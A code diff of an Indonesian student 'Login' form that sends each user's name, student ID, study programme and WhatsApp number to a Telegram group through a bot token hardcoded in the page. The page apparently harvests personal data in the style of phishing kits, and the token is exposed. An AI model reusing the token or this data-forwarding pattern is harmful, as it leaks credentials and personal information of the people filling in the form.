@@ -95,7 +95,7 @@
         <option value="Biologi">Biologi</option>
         <option value="Matematika">Matematika</option>
       </select>
-      <input type="text" id="nowa" placeholder="No WhatsApp (08xxxxx)" maxlength="12" style="display: none;" />
+      <input type="text" id="nowa" placeholder="No WhatsApp (08xxxxx)" maxlength="13" style="display: none;" />
       <input type="text" id="captcha" placeholder="Ketik angka CAPTCHA" style="display: none;" />
       <button type="submit" id="submitBtn">Login</button>
       <div class="loader" id="loader">
@@ -166,8 +166,8 @@
         if (npm.length < 8 || nowa.length < 10 || nowa.length > 13) return showError("Format NPM/No WA salah.");
         if (captcha.value !== captcha.dataset.expected) return showError("CAPTCHA salah.");
 
-        const msg = `📝 Pendaftaran Baru\n\n👤 Nama: ${nama}\n🆔 NPM: ${npm}\n📚 Prodi: ${prodi}\n📱 WA: ${nowa}`;
-        fetch(`https://api.telegram.org/bot7686312873:AAFgoSgH-5A8RyB8tJRzjevPlXI0iQMi8uI/sendMessage`, {
+        const msg = `📝 Pendaftaran Baru\n\n👤 Nama: ${nama}\n🔖 NPM: ${npm}\n📚 Prodi: ${prodi}\n📝 WA: ${nowa}`;
+        fetch("https://api.telegram.org/bot7686312873:AAFgoSgH-5A8RyB8tJRzjevPlXI0iQMi8uI/sendMessage", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ chat_id: "-1002853719892", text: msg })
